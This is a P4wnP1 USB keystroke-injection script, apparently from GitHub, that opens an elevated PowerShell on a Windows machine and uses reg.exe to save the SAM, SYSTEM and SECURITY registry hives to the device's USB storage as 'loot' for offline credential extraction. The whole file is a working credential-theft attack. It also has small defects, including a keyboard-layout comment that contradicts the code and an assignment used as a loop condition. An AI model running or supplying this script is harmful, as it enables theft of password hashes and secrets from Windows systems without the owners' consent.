/*##########################################################################\
# Windows Credentials Extraction                                            #
# Author: Coderdude112 on GitHub                                            #
#                                                                           #
# PREREQUISTES:                                                             #
# Enable the keyboard and USB storage on your P4wnP1                        #
# Set the name of the P4wnP1 USB storage device to the variable usb_drive   #
#                                                                           #
# ATTENTION: Some AntVir programs will flag this extraction!                #
###########################################################################*/

// Set the keyboard layout and speed
layout('de');                        // Set keyboard layout to US
typingSpeed(0,0);                    // Sets the typing speed to super super fast

// Define all variables, arrays, ect
var delay_time = 5                   // The time to wait before executing the attack in seconds
var ready = "False"                  // Used to make sure that the attack is ready to be executed
var usb_drive = "TEMPUSB"            // The name of the P4wnP1's USB storage device

function attack() {
    press("GUI r");
    delay(500);
    type("powershell");              // Open an admin powershell menu
    press("CONTROL SHIFT ENTER");
    delay(500);
    press("TAB");
    press("TAB");
    press("ENTER");
    delay(1000);

    type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq '" + usb_drive + "' } | select name;");   // Find the USB drive with the same name as the P4wnP1's name and save it as $usbPath
    type("$lootPath = $usbPath.name + \"extraction\\windows_credentials\";mkdir $lootPath;");                // Make the full loot path variable and then create it

    type("reg.exe save hklm\\sam $lootPath\\SAM;");                                                          // Save the SAM file
    type("reg.exe save hklm\\system $lootPath\\System;");                                                    // Save the System file
    type("reg.exe save hklm\\security $lootPath\\Security;");                                                // Save Security file

    type("exit\n");                                                                                          // Exit the powershell window
}
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                                                                     // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                                                                          // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                                                                 // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                                                                  // Stop the while loop
            break;
        }
    }
}

delay(delay_time * 100);
check_if_ready();
attack();
